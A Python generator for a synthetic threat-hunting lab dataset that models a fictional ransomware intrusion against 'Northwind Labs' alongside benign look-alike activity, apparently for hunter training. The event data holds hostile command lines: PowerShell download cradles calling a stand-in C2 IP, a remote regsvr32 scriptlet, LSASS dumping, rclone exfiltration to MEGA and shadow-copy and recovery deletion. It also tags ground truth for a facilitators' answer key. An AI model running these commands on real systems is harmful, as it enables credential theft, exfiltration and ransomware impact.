#!/usr/bin/env python3
"""
CTI Hunt Loop Kit - synthetic lab dataset generator.

Builds a small, fully synthetic Windows telemetry set for the fictional organisation
"Northwind Labs" (domain LAB.EXAMPLE) covering five days of normal activity plus one
ransomware intrusion ("Operation Quiet Ledger") that touches every hunt playbook HL-0001
to HL-0010. Benign look-alikes are planted on purpose so hunters practise triage.

Output (written next to this script, under ./lab):
  sysmon/process_creation.jsonl   Sysmon EID 1   (Sigma process_creation / SPL)
  sysmon/registry_set.jsonl       Sysmon EID 13  (Sigma registry_set / SPL)
  sysmon/network_connection.jsonl Sysmon EID 3   (SPL / pivots)
  security/security.jsonl         Security 4624 / 4769 (Sigma service: security / SPL)
  sysmon/dns_query.jsonl          Sysmon EID 22  (Sigma dns_query / SPL)
  linux/process_creation.jsonl    Sysmon for Linux EID 1 (Sigma linux process_creation / SPL)
  entra/signinlogs.jsonl          Entra ID sign-ins, flattened (Sigma azure signinlogs / SPL)
  entra/auditlogs.jsonl           Entra ID audit log, flattened (Sigma azure auditlogs / SPL)
  sentinel/SigninLogs.csv, AuditLogs.csv, DnsEvents.csv   Sentinel schemas (KQL)
  mde/DeviceProcessEvents.csv     Defender XDR schema (KQL)
  mde/DeviceRegistryEvents.csv
  mde/DeviceNetworkEvents.csv
  sentinel/SecurityEvent.csv      Sentinel SecurityEvent schema (KQL)
  ../answer_key.json              Ground truth per hunt (facilitators only)

Everything is deterministic (fixed seed). All names, hosts, users and IPs are invented;
IPs come from private ranges and the documentation ranges 198.51.100.0/24 and 203.0.113.0/24.
Licensed Apache-2.0 with the rest of the kit. Standard library only.
"""
import base64
import csv
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

SEED = 20271
START = datetime(2026, 10, 5, 0, 0, 0, tzinfo=timezone.utc)
DAYS = 5
DOMAIN = "LAB"
OUT = Path(__file__).resolve().parent / "lab"
KEY = Path(__file__).resolve().parent / "answer_key.json"

rnd = random.Random(SEED)

# --------------------------------------------------------------------------- environment
WORKSTATIONS = {f"WS-{dept}-{n:02d}": f"10.10.20.{10 + i}"
                for i, (dept, n) in enumerate(
                    [(d, n) for d in ("FIN", "ENG", "HR", "OPS", "MKT") for n in range(1, 9)])}
WORKSTATIONS["WS-FIN-07"] = "10.10.20.57"
SERVERS = {
    "SRV-DC-01": "10.10.10.5", "SRV-FILE-01": "10.10.10.21", "SRV-BKP-01": "10.10.10.31",
    "SRV-SCCM-01": "10.10.10.40", "SRV-APP-02": "10.10.10.52", "SRV-APP-LEGACY": "10.10.10.60",
    "SRV-WEB-01": "10.10.10.70",
}
JUMP = {"JMP-ADM-01": "10.10.5.10"}
HELPDESK = {"HD-SUPPORT-01": "10.10.30.15"}
HOSTS = {**WORKSTATIONS, **SERVERS, **JUMP, **HELPDESK}
FQDN = lambda h: f"{h}.lab.example"

USERS = {h: f"user{idx:02d}" for idx, h in enumerate(sorted(WORKSTATIONS))}
USERS["WS-FIN-07"] = "jmiller"
USERS["WS-HR-03"] = "akhan"
ADMINS = ["admin_tlee", "admin_rgomez"]
SPNS_AES = ["svc_sql", "svc_web", "svc_sharepoint", "svc_backup", "HTTP/intranet", "MSSQLSvc/SRV-APP-02"]
SID = {u: f"S-1-5-21-3623811015-3361044348-30300820-{1100 + i}" for i, u in enumerate(sorted(set(USERS.values())))}

C2 = "203.0.113.45"
C2_ALT = "203.0.113.80"
MEGA = ["198.51.100.23", "198.51.100.24", "198.51.100.61"]

SYS32 = r"C:\Windows\System32"
PS = SYS32 + r"\WindowsPowerShell\v1.0\powershell.exe"

proc_events, reg_events, net_events, sec_events = [], [], [], []
signin_events, audit_events, linux_events, dns_events = [], [], [], []
truth = {f"HL-{n:04d}": {"malicious": [], "benign_match": []} for n in range(1, 15)}


def ts(day, hh, mm, ss=None):
    return START + timedelta(days=day, hours=hh, minutes=mm, seconds=rnd.randint(0, 59) if ss is None else ss)


def rand_time():
    day = rnd.randrange(DAYS)
    hour = rnd.choices(range(24), weights=[1] * 7 + [6] * 11 + [2] * 6)[0]
    return ts(day, hour, rnd.randint(0, 59))


def enc(ps):
    return base64.b64encode(ps.encode("utf-16-le")).decode()


def basename(p):
    return p.split("\\")[-1]


# tags: list of (hunt_id, 'malicious' | 'benign_match', note)
def proc(t, host, image, cmd, parent, parent_cmd="", user=None, ofn=None, desc="", pid=None, tags=()):
    proc_events.append(dict(
        _t=t, _tags=list(tags), Computer=FQDN(host), Image=image, CommandLine=cmd,
        OriginalFileName=ofn or basename(image), Description=desc, ParentImage=parent,
        ParentCommandLine=parent_cmd or parent, User=user or f"{DOMAIN}\\{USERS.get(host, 'SYSTEM')}",
        ProcessId=pid or rnd.randint(1000, 15000), ParentProcessId=rnd.randint(500, 12000),
        IntegrityLevel="System" if (user or "").endswith("SYSTEM") else "Medium"))


def reg(t, host, key_path, value_name, details, image, user, tags=()):
    reg_events.append(dict(_t=t, _tags=list(tags), Computer=FQDN(host), EventType="SetValue",
                           TargetObject=f"{key_path}\\{value_name}", Details=details, Image=image, User=user))


def net(t, host, image, ofn, dst_ip, dst_host, port, user, tags=()):
    net_events.append(dict(_t=t, _tags=list(tags), Computer=FQDN(host), Image=image, OriginalFileName=ofn,
                           User=user, SourceIp=HOSTS[host], DestinationIp=dst_ip, DestinationHostname=dst_host,
                           DestinationPort=port, Protocol="tcp", Initiated="true"))


def tgs(t, requester, src_ip, service, etype, status="0x0", tags=()):
    sec_events.append(dict(_t=t, _tags=list(tags), EventID=4769, Computer=FQDN("SRV-DC-01"),
                           TargetUserName=f"{requester}@LAB.EXAMPLE", TargetDomainName="LAB.EXAMPLE",
                           ServiceName=service, TicketEncryptionType=etype, TicketOptions="0x40810000",
                           Status=status, IpAddress=f"::ffff:{src_ip}", LogonType=None, WorkstationName=None))


def logon(t, host, user, logon_type, src_ip, src_ws, tags=()):
    sec_events.append(dict(_t=t, _tags=list(tags), EventID=4624, Computer=FQDN(host), TargetUserName=user,
                           TargetDomainName=DOMAIN, ServiceName=None, TicketEncryptionType=None, TicketOptions=None,
                           Status=None, IpAddress=src_ip, LogonType=logon_type, WorkstationName=src_ws))


M = "malicious"
B = "benign_match"

# --------------------------------------------------------------------------- benign baseline
APPS = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", '"chrome.exe" --type=renderer --lang=en-US'),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", '"OUTLOOK.EXE"'),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", '"EXCEL.EXE" /dde'),
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", '"WINWORD.EXE" /n'),
    (SYS32 + r"\notepad.exe", "notepad.exe"),
    (r"C:\Program Files\Microsoft VS Code\Code.exe", '"Code.exe"'),
    (SYS32 + r"\cmd.exe", "cmd.exe"),
    (SYS32 + r"\mstsc.exe", "mstsc.exe"),
]
EXPLORER = r"C:\Windows\explorer.exe"
for _ in range(1400):
    host = rnd.choice(list(WORKSTATIONS))
    image, cmd = rnd.choice(APPS)
    proc(rand_time(), host, image, cmd, EXPLORER)

for _ in range(250):  # interactive admin PowerShell, no encoding / cradles
    host = rnd.choice(list(WORKSTATIONS) + ["JMP-ADM-01"])
    proc(rand_time(), host, PS, rnd.choice([
        "powershell.exe", "powershell.exe -NoProfile", "powershell.exe Get-Service | Where Status -eq Running",
        "powershell.exe -File C:\\Scripts\\Map-Drives.ps1"]), EXPLORER)

for _ in range(300):  # services and system noise
    host = rnd.choice(list(HOSTS))
    proc(rand_time(), host, SYS32 + r"\svchost.exe", "svchost.exe -k netsvcs -p -s Schedule",
         SYS32 + r"\services.exe", user="NT AUTHORITY\\SYSTEM")
    proc(rand_time(), host, SYS32 + r"\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
         SYS32 + r"\cmd.exe", user="NT AUTHORITY\\SYSTEM")

# SCCM client: encoded PowerShell on many hosts (HL-0001 benign match)
CCM = r"C:\Windows\CCM\CcmExec.exe"
sccm_ps = enc("Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,LastBootUpTime")
for host in rnd.sample(list(WORKSTATIONS), 18):
    for day in range(DAYS):
        proc(ts(day, 6, rnd.randint(0, 59)), host, PS, f"powershell.exe -NoLogo -NonInteractive -enc {sccm_ps}",
             CCM, user="NT AUTHORITY\\SYSTEM", tags=[("HL-0001", B, "SCCM inventory script (CcmExec parent, fleet-wide, SYSTEM)")])

# SCCM compliance baseline through WMI (filtered out of HL-0005 by design)
for host in rnd.sample(list(WORKSTATIONS), 12):
    proc(ts(rnd.randrange(DAYS), 7, rnd.randint(0, 59)), host, PS,
         r"powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\b6d1c2e0.ps1",
         SYS32 + r"\wbem\WmiPrvSE.exe", user="NT AUTHORITY\\SYSTEM")

# Scheduled tasks: Google (no match) and Dell SupportAssist from ProgramData (HL-0003 benign match)
for host in rnd.sample(list(WORKSTATIONS), 6):
    proc(rand_time(), host, SYS32 + r"\schtasks.exe",
         'schtasks.exe /create /tn "GoogleUpdateTaskMachineUA" /tr "\\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\\" /ua /installsource scheduler" /sc hourly /f',
         r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe", user="NT AUTHORITY\\SYSTEM")
for host in rnd.sample(list(WORKSTATIONS), 4):
    proc(rand_time(), host, SYS32 + r"\schtasks.exe",
         'schtasks.exe /create /tn "Dell SupportAssistAgent AutoUpdate" /tr "C:\\ProgramData\\Dell\\SupportAssist\\agent\\update.exe" /sc daily /st 03:00 /f',
         r"C:\Program Files\Dell\SupportAssistAgent\bin\SupportAssistInstaller.exe", user="NT AUTHORITY\\SYSTEM",
         tags=[("HL-0003", B, "Dell SupportAssist updater task (signed vendor installer parent)")])

# Admin PsExec from the jump host to an app server (HL-0005 benign match)
for d in (1, 3):
    proc(ts(d, 14, 5), "SRV-APP-02", SYS32 + r"\cmd.exe", "cmd.exe /c iisreset /status", r"C:\Windows\PSEXESVC.exe",
         user=f"{DOMAIN}\\admin_tlee", tags=[("HL-0005", B, "Admin PsExec from JMP-ADM-01 (approved jump host, admin account)")])
    logon(ts(d, 14, 4), "SRV-APP-02", "admin_tlee", 3, JUMP["JMP-ADM-01"], "JMP-ADM-01")

# ProcDump against IIS worker (no HL-0002 match: not LSASS)
proc(ts(2, 11, 20), "SRV-WEB-01", r"C:\Tools\Sysinternals\procdump64.exe",
     r"procdump64.exe -accepteula -ma w3wp.exe C:\Dumps\w3wp_hang.dmp", PS, user=f"{DOMAIN}\\admin_rgomez")

# Backup software pruning shadows (HL-0007 benign match) and listing (no match)
VEEAM = r"C:\Program Files\Veeam\Endpoint Backup\Veeam.EndPoint.Service.exe"
for day in range(DAYS):
    proc(ts(day, 1, 30), "SRV-BKP-01", SYS32 + r"\vssadmin.exe", "vssadmin.exe delete shadows /for=E: /oldest /quiet",
         VEEAM, user="NT AUTHORITY\\SYSTEM", tags=[("HL-0007", B, "Veeam pruning oldest shadow on E: (backup service parent, nightly)")])
    proc(ts(day, 1, 29), "SRV-BKP-01", SYS32 + r"\vssadmin.exe", "vssadmin.exe list shadows /for=E:",
         VEEAM, user="NT AUTHORITY\\SYSTEM")

# Local HTA and rundll32 control panel (no HL-0008 match)
for host in rnd.sample(list(WORKSTATIONS), 5):
    proc(rand_time(), host, SYS32 + r"\mshta.exe", r'mshta.exe "C:\Program Files\Contoso Payroll\launcher.hta"', EXPLORER)
    proc(rand_time(), host, SYS32 + r"\rundll32.exe", r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl", EXPLORER)
    proc(rand_time(), host, SYS32 + r"\rundll32.exe", r'rundll32.exe printui.dll,PrintUIEntry /in /n "\\SRV-FILE-01\HP-Floor2"', EXPLORER)

# IT-approved rclone sync to corporate S3 (HL-0010 benign match)
for day in range(DAYS):
    proc(ts(day, 2, 15), "SRV-BKP-01", r"C:\Program Files\rclone\rclone.exe",
         r'rclone.exe sync D:\Exports s3corp:northwind-exports --config "C:\Program Files\rclone\rclone.conf" --log-file D:\Logs\rclone.log',
         SYS32 + r"\svchost.exe", user=f"{DOMAIN}\\svc_rclone", desc="Rsync for cloud storage",
         tags=[("HL-0010", B, "Nightly IT sync to sanctioned corporate S3 remote (s3corp:)")])
    net(ts(day, 2, 16), "SRV-BKP-01", r"C:\Program Files\rclone\rclone.exe", "rclone.exe", "198.51.100.200",
        "s3.us-east-1.amazonaws.com", 443, f"{DOMAIN}\\svc_rclone")

# Normal web traffic
for _ in range(600):
    host = rnd.choice(list(WORKSTATIONS))
    net(rand_time(), host, APPS[0][0], "chrome.exe", f"198.51.100.{rnd.randint(100, 199)}",
        rnd.choice(["www.bing.com", "outlook.office365.com", "github.com", "teams.microsoft.com", "news.example.com"]),
        443, f"{DOMAIN}\\{USERS[host]}")

# Registry autoruns: Teams in AppData\Local (no match), Spotify in AppData\Roaming (HL-0004 benign match)
for host in rnd.sample(list(WORKSTATIONS), 20):
    u = USERS[host]
    reg(rand_time(), host, f"HKU\\{SID[u]}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "com.squirrel.Teams.Teams",
        f'C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart "Teams.exe" --process-start-args "--system-initiated"',
        f"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", f"{DOMAIN}\\{u}")
    reg(rand_time(), host, f"HKU\\{SID[u]}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDrive",
        f'"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
        f"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", f"{DOMAIN}\\{u}")
for host in rnd.sample(list(WORKSTATIONS), 3):
    u = USERS[host]
    reg(rand_time(), host, f"HKU\\{SID[u]}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Spotify",
        f'"C:\\Users\\{u}\\AppData\\Roaming\\Spotify\\Spotify.exe" --autostart --minimized',
        f"C:\\Users\\{u}\\AppData\\Roaming\\Spotify\\Spotify.exe", f"{DOMAIN}\\{u}",
        tags=[("HL-0004", B, "Spotify per-user install in AppData\\Roaming (signed, user-installed app)")])
for host in rnd.sample(list(HOSTS), 15):
    reg(rand_time(), host, r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SecurityHealth",
        r"%windir%\system32\SecurityHealthSystray.exe", SYS32 + r"\SecurityHealthService.exe", "NT AUTHORITY\\SYSTEM")

# Kerberos: normal AES tickets, machine-account RC4 (filtered), legacy app RC4 (HL-0006 benign match)
for _ in range(900):
    host = rnd.choice(list(WORKSTATIONS))
    tgs(rand_time(), USERS[host], HOSTS[host], rnd.choice(SPNS_AES + ["SRV-FILE-01$", "SRV-APP-02$"]), "0x12")
for _ in range(40):
    tgs(rand_time(), "SRV-APP-02$", SERVERS["SRV-APP-02"], "SRV-DC-01$", "0x17")
for day in range(DAYS):
    for hh in (8, 12, 16):
        tgs(ts(day, hh, rnd.randint(0, 59)), "svc_legacyapp", SERVERS["SRV-APP-LEGACY"], "svc_legacydb", "0x17",
            tags=[("HL-0006", B, "SRV-APP-LEGACY RC4-only app: one SPN, steady schedule, server source")])

# Logons: network logons, admin RDP from jump host (filtered), help desk RDP (HL-0009 benign match)
for _ in range(700):
    host = rnd.choice(list(WORKSTATIONS))
    logon(rand_time(), rnd.choice(["SRV-FILE-01", "SRV-APP-02", "SRV-WEB-01"]), USERS[host], 3, HOSTS[host], host)
for _ in range(25):
    logon(rand_time(), rnd.choice(list(SERVERS)), rnd.choice(ADMINS), 10, JUMP["JMP-ADM-01"], "JMP-ADM-01")
for _ in range(6):
    target = rnd.choice(list(WORKSTATIONS))
    logon(rand_time(), target, "hd_support", 10, HELPDESK["HD-SUPPORT-01"], "HD-SUPPORT-01",
          tags=[("HL-0009", B, "Help desk RDP to workstations from HD-SUPPORT-01 (support subnet, ticketed)")])

# --------------------------------------------------------------------------- the intrusion
# Day 2 (Oct 7): phishing on WS-HR-03 fails, WS-FIN-07 succeeds. Day 3 (Oct 8): lateral movement, exfil, impact.
V, VIP, U = "WS-FIN-07", WORKSTATIONS["WS-FIN-07"], f"{DOMAIN}\\jmiller"
WORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
OUTLOOK = r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"
STAGE = r"C:\ProgramData\svcupd"

proc(ts(2, 8, 52), "WS-HR-03", SYS32 + r"\mshta.exe", f"mshta.exe https://{C2_ALT}/invoice_8841.hta", OUTLOOK,
     user=f"{DOMAIN}\\akhan", tags=[("HL-0008", M, "Remote HTA from phishing link (blocked by proxy, no follow-on)")])

cradle = enc(f"IEX (New-Object Net.WebClient).DownloadString('http://{C2}/a.ps1')")
proc(ts(2, 9, 14, 7), V, PS, f"powershell.exe -nop -w hidden -enc {cradle}", WORD, f'"WINWORD.EXE" /n "C:\\Users\\jmiller\\Downloads\\Q3_Remittance.docm"',
     user=U, tags=[("HL-0001", M, "Encoded download cradle spawned by WINWORD (macro)")])
net(ts(2, 9, 14, 9), V, PS, "PowerShell.EXE", C2, C2, 80, U)
proc(ts(2, 9, 15, 30), V, SYS32 + r"\regsvr32.exe", f"regsvr32.exe /s /n /u /i:http://{C2}/r.sct scrobj.dll", PS, user=U,
     ofn="REGSVR32.EXE", tags=[("HL-0008", M, "Squiblydoo: regsvr32 loading remote scriptlet")])
net(ts(2, 9, 15, 31), V, SYS32 + r"\regsvr32.exe", "REGSVR32.EXE", C2, C2, 80, U)
proc(ts(2, 9, 18, 2), V, PS, f"powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://{C2}/stage2.ps1')\"",
     SYS32 + r"\regsvr32.exe", user=U, tags=[("HL-0001", M, "Plain-text download cradle from regsvr32 parent")])

reg(ts(2, 9, 21), V, f"HKU\\{SID['jmiller']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDriveUpdate",
    r"C:\Users\jmiller\AppData\Roaming\Microsoft\odupd.exe", PS, U,
    tags=[("HL-0004", M, "Masquerading OneDrive Run value pointing to AppData\\Roaming dropper")])
proc(ts(2, 9, 23), V, SYS32 + r"\schtasks.exe",
     f'schtasks.exe /create /tn "\\Microsoft\\Windows\\WindowsUpdate\\Sync" /tr "{STAGE}\\svchost.exe" /sc onlogon /ru SYSTEM /f',
     PS, user=U, tags=[("HL-0003", M, "Task masquerading under \\Microsoft\\Windows\\ running ProgramData binary as SYSTEM")])

for minute, svc in zip((41, 41, 42, 42), ("svc_sql", "svc_backup", "svc_web", "svc_sharepoint")):
    tgs(ts(2, 10, minute), "jmiller", VIP, svc, "0x17",
        tags=[("HL-0006", M, "Burst of RC4 TGS requests for 4 SPNs from a finance workstation user")])

proc(ts(2, 11, 3), V, SYS32 + r"\rundll32.exe", r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\ProgramData\l.dmp full",
     PS, user=U, ofn="RUNDLL32.EXE", tags=[("HL-0002", M, "comsvcs.dll MiniDump of LSASS (PID 712)")])

# Day 3: lateral movement with cracked svc_backup
SB = f"{DOMAIN}\\svc_backup"
WMI = SYS32 + r"\wbem\WmiPrvSE.exe"
for i, c in enumerate(["whoami /all", "ipconfig /all", "net group \"Domain Admins\" /domain", "tasklist /v"]):
    proc(ts(3, 0, 12 + i), "SRV-FILE-01", SYS32 + r"\cmd.exe", f"cmd.exe /Q /c {c} 1> \\\\127.0.0.1\\ADMIN$\\__1759882{300 + i}.43 2>&1",
         WMI, user=SB, tags=[("HL-0005", M, "wmiexec-style cmd with ADMIN$ output redirection")])
logon(ts(3, 0, 11), "SRV-FILE-01", "svc_backup", 3, VIP, V)
proc(ts(3, 0, 25), "SRV-FILE-01", f"{STAGE}\\pd64.exe", f"pd64.exe -accepteula -ma lsass.exe {STAGE}\\out.dmp",
     SYS32 + r"\cmd.exe", user=SB, ofn="procdump", desc="Sysinternals process dump utility",
     tags=[("HL-0002", M, "Renamed ProcDump dumping LSASS on file server")])

logon(ts(3, 0, 40), "SRV-FILE-01", "svc_backup", 10, VIP, V,
      tags=[("HL-0009", M, "Service account RDP from a finance workstation")])
logon(ts(3, 0, 58), "SRV-BKP-01", "svc_backup", 10, VIP, V,
      tags=[("HL-0009", M, "Service account RDP from a finance workstation")])

proc(ts(3, 1, 5), "SRV-BKP-01", SYS32 + r"\cmd.exe", r"cmd.exe /c C:\ProgramData\svcupd\kill.bat", r"C:\Windows\PSEXESVC.exe",
     user=SB, tags=[("HL-0005", M, "PsExec service launching batch file from staging dir")])

# Exfil from file server
RCL = f"{STAGE}\\rcl.exe"
proc(ts(3, 1, 20), "SRV-FILE-01", RCL,
     f"rcl.exe copy \\\\SRV-FILE-01\\Finance mega:fin --config {STAGE}\\rc.conf --transfers 16 --max-age 2y --ignore-existing -q",
     SYS32 + r"\cmd.exe", user=SB, ofn="rclone.exe", desc="Rsync for cloud storage",
     tags=[("HL-0010", M, "Renamed rclone copying Finance share to MEGA remote")])
for i in range(60):
    ip = MEGA[i % 3]
    net(ts(3, 1, 20 + i // 2), "SRV-FILE-01", RCL, "rclone.exe", ip,
        "g.api.mega.co.nz" if i % 3 == 0 else f"gfs{270 + i % 7}n{300 + i}.userstorage.mega.co.nz", 443, SB)

# Impact
for host, base in (("SRV-FILE-01", 0), ("SRV-BKP-01", 5)):
    t0 = 2 + base
    for j, (img, c) in enumerate([
        ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
        ("WMIC.exe", "wmic.exe shadowcopy delete /nointeractive"),
        ("bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled No"),
        ("bcdedit.exe", "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"),
        ("wbadmin.exe", "wbadmin.exe delete catalog -quiet"),
    ]):
        proc(ts(3, 2, t0 + j), host, f"{SYS32}\\{img}" if img != "WMIC.exe" else SYS32 + r"\wbem\WMIC.exe", c,
             SYS32 + r"\cmd.exe", r"cmd.exe /c C:\ProgramData\svcupd\kill.bat", user=SB,
             tags=[("HL-0007", M, "Pre-encryption recovery inhibition from kill.bat")])
    proc(ts(3, 2, t0 + 12), host, f"{STAGE}\\svchost.exe", f"{STAGE}\\svchost.exe -p \\\\{host}\\D$ -nomutex",
         SYS32 + r"\cmd.exe", r"cmd.exe /c C:\ProgramData\svcupd\kill.bat", user=SB)  # the encryptor - no hunt matches it directly; found by pivoting


# --------------------------------------------------------------------------- v1.1: cloud identity, Linux, DNS
# Appended after the v1.0 events so the original event IDs and answer key stay stable.
OFFICE_IP = "198.51.100.10"      # corporate egress NAT
ATTACKER_IP = "203.0.113.99"     # anonymizing VPN exit used by the affiliate
UPN = lambda u: f"{u}@lab.example"
APPS_365 = ["Office 365 Exchange Online", "Microsoft Teams", "OfficeHome", "SharePoint Online", "Microsoft Edge"]
RESULT_TEXT = {0: "", 50126: "Invalid username or password or Invalid on-premise username or password.",
               50074: "Strong Authentication is required.",
               500121: "Authentication failed during strong authentication request."}


def signin(t, user, ip, result, app=None, location="US", auth_req="multiFactorAuthentication", detail="", tags=()):
    signin_events.append(dict(_t=t, _tags=list(tags), UserPrincipalName=UPN(user), AppDisplayName=app or rnd.choice(APPS_365),
                              IPAddress=ip, Location=location, ResultType=result, ResultDescription=RESULT_TEXT[result],
                              AuthenticationRequirement=auth_req, AuthenticationMethod="Mobile app notification",
                              AuthenticationDetail=detail, ClientAppUsed="Browser",
                              ConditionalAccessStatus="success" if result == 0 else "notApplied"))


def consent(t, user, ip, app_name, app_id, scopes, admin=False, verified=False, op="Consent to application", tags=()):
    audit_events.append(dict(_t=t, _tags=list(tags), OperationName=op, Category="ApplicationManagement", Result="success",
                             InitiatedBy=UPN(user), InitiatedByIp=ip, TargetAppName=app_name, TargetAppId=app_id,
                             ConsentPermissions=scopes, IsAdminConsent=admin, PublisherVerified=verified))


def lproc(t, host, image, cmd, parent, user="root", tags=()):
    linux_events.append(dict(_t=t, _tags=list(tags), Computer=f"{host.lower()}.lab.example", Image=image, CommandLine=cmd,
                             ParentImage=parent, User=user, ProcessId=rnd.randint(1000, 60000)))


def dnsq(t, host, image, name, qtype="A", tags=()):
    dns_events.append(dict(_t=t, _tags=list(tags), Computer=FQDN(host), Image=image, QueryName=name, QueryType=qtype,
                           QueryStatus=0, User=f"{DOMAIN}\\{USERS.get(host, 'SYSTEM')}"))


# Entra ID sign-ins: daily office sign-ins, a few typos, one-off accidental denials, one user with a lost phone
for host, u in USERS.items():
    for day in range(DAYS):
        if rnd.random() < 0.85:
            signin(ts(day, rnd.randint(7, 9), rnd.randint(0, 59)), u, OFFICE_IP, 0)
        if rnd.random() < 0.08:
            signin(ts(day, rnd.randint(9, 17), rnd.randint(0, 59)), u, OFFICE_IP, 50126, auth_req="singleFactorAuthentication")
for u in rnd.sample(sorted(set(USERS.values()) - {"jmiller"}), 4):
    signin(rand_time(), u, OFFICE_IP, 500121, detail="MFA denied; user declined the authentication",
           tags=[("HL-0012", B, "Single MFA denial from the office IP (accidental tap or stale prompt), no burst")])
LOST = "user05"
for i in range(3):
    signin(ts(3, 8, 10 + i * 4), LOST, OFFICE_IP, 500121, detail="MFA denied; user did not respond to the authentication request",
           tags=[("HL-0012", B, "user05 replaced phone: 3 timeouts from office IP, then help desk re-registered MFA")])
signin(ts(3, 8, 40), LOST, OFFICE_IP, 0)

# Attack day 1 (Oct 6, evening): password from an earlier phish, then push bombing until jmiller approves
for i in range(14):
    signin(ts(1, 23, 31 + i), "jmiller", ATTACKER_IP, 500121, app="OfficeHome", location="NL",
           detail="MFA denied; user declined the authentication",
           tags=[("HL-0012", M, "MFA push bombing of jmiller from anonymizing VPN (203.0.113.99)")])
signin(ts(1, 23, 47), "jmiller", ATTACKER_IP, 0, app="OfficeHome", location="NL")

# Entra ID audit: routine consents and an approved backup app (admin consent), then the illicit consent grant
for u in rnd.sample(sorted(set(USERS.values())), 9):
    consent(rand_time(), u, OFFICE_IP, "Zoom", "f2a9c1e4-0f36-4b7a-9a43-1d2e8c7b5a10", "openid profile email offline_access User.Read",
            verified=True)
for u in rnd.sample(sorted(set(USERS.values())), 4):
    consent(rand_time(), u, OFFICE_IP, "Calendly", "6b0e1d9f-3c4a-4e57-8d21-90f7a2b4c3e8", "User.Read Calendars.ReadWrite offline_access",
            verified=True)
consent(ts(0, 15, 12), "admin_tlee", OFFICE_IP, "Northwind Backup for M365",
        "3c7d5a2e-8b14-4f90-a6c3-5e1f0d9b7a24", "Mail.Read Files.Read.All Sites.Read.All offline_access", admin=True, verified=True,
        tags=[("HL-0011", B, "Admin consent (admin_tlee) to the sanctioned M365 backup app, verified publisher, change ticket")])
for _ in range(25):
    audit_events.append(dict(_t=rand_time(), _tags=[], OperationName=rnd.choice(["Update user", "Add member to group", "Reset user password"]),
                             Category="UserManagement", Result="success", InitiatedBy=UPN(rnd.choice(ADMINS)),
                             InitiatedByIp=OFFICE_IP, TargetAppName="", TargetAppId="", ConsentPermissions="",
                             IsAdminConsent=False, PublisherVerified=False))
EVIL_APP = "9e3b7c1a-55d2-4f0e-b8a4-7c6d2e1f0a93"
consent(ts(1, 23, 51), "jmiller", ATTACKER_IP, "Remittance Viewer", EVIL_APP, "", op="Add service principal")
consent(ts(1, 23, 52), "jmiller", ATTACKER_IP, "Remittance Viewer", EVIL_APP,
        "User.Read Mail.Read Files.Read.All offline_access", tags=[("HL-0011", M, "Illicit consent grant: unverified app, mailbox + file scopes, from attacker VPN IP")])

# Linux servers: NAS and web. Routine admin noise, config management, a health-check cron, then the affiliate
LNX = {"LNX-NAS-01": "10.10.10.80", "LNX-WEB-02": "10.10.10.81"}
for _ in range(220):
    host = rnd.choice(list(LNX))
    image, cmd, parent, user = rnd.choice([
        ("/usr/bin/bash", "-bash", "/usr/sbin/sshd", "admin_rgomez"),
        ("/usr/bin/ls", "ls -la /volume1/backups", "/usr/bin/bash", "admin_rgomez"),
        ("/usr/bin/rsync", "rsync -a --delete /volume1/exports/ /volume2/mirror/", "/usr/sbin/cron", "root"),
        ("/usr/sbin/logrotate", "/usr/sbin/logrotate /etc/logrotate.conf", "/usr/sbin/cron", "root"),
        ("/usr/bin/apt-get", "apt-get -qq update", "/usr/bin/bash", "root"),
        ("/usr/bin/systemctl", "systemctl status nginx", "/usr/bin/bash", "admin_rgomez"),
        ("/usr/bin/df", "df -h", "/usr/bin/bash", "admin_rgomez"),
    ])
    lproc(rand_time(), host, image, cmd, parent, user)
lproc(ts(0, 10, 5), "LNX-WEB-02", "/usr/bin/sh",
      "sh -c \"echo '0 */12 * * * root test -x /usr/bin/certbot && certbot -q renew' > /etc/cron.d/certbot\"", "/usr/bin/dpkg")
for host in LNX:
    lproc(ts(1, 14, 2), host, "/usr/bin/cp",
          "cp /tmp/ansible-tmp-1759755720.41-8812/source /etc/systemd/system/node_exporter.service", "/usr/bin/python3",
          tags=[("HL-0013", B, "Ansible deploying node_exporter unit from its /tmp staging dir (python3 parent, change window, both hosts)")])
lproc(ts(2, 16, 30), "LNX-NAS-01", "/usr/bin/sh",
      "sh -c \"echo '*/10 * * * * root curl -fsS -m 10 https://healthchecks.lab.example/ping/nas-backup' >> /etc/crontab\"",
      "/usr/bin/bash", tags=[("HL-0013", B, "Backup heartbeat cron calling the internal healthchecks.lab.example URL")])

# Oct 8: affiliate pivots from SRV-BKP-01 to the NAS over SSH as root (password reused from svc_backup vault entry)
lproc(ts(3, 1, 33), "LNX-NAS-01", "/usr/bin/bash", "-bash", "/usr/sbin/sshd")
